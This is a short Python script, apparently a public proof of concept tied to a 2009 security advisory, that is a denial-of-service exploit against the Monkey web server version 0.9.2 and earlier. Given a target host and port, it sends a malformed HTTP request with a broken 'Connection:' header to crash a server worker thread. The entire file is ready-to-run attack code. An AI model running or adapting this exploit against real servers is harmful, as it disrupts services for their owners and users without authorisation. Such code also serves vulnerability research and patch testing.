#!/usr/bin/env python
# monkeyex.py -- Patroklos Argyroudis, argp at domain census-labs.com
#
# Denial of service exploit for Monkey web server version <= 0.9.2:
#
# http://census-labs.com/news/2009/12/14/monkey-httpd/

import os
import sys
import socket

GET = "GET / "

def main(argv):
    argc = len(argv)

    if argc != 3:
        print "usage: %s <host> <port>" % (argv[0])
        sys.exit(0)

    host = argv[1]
    port = int(argv[2])

    print "[*] target: %s:%d" % (host, port)

    payload = GET
    payload += "HTTP/1.1\r\nConnection:\n\r\n\r\n";

    print "[*] payload: %s" % (payload)

    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sd.connect((host, port))

    print "[*] attempting to crash one Monkey worker thread.."
    sd.send(payload)
    sd.close()

if __name__ == "__main__":
    main(sys.argv)
    sys.exit(0)

# EOF
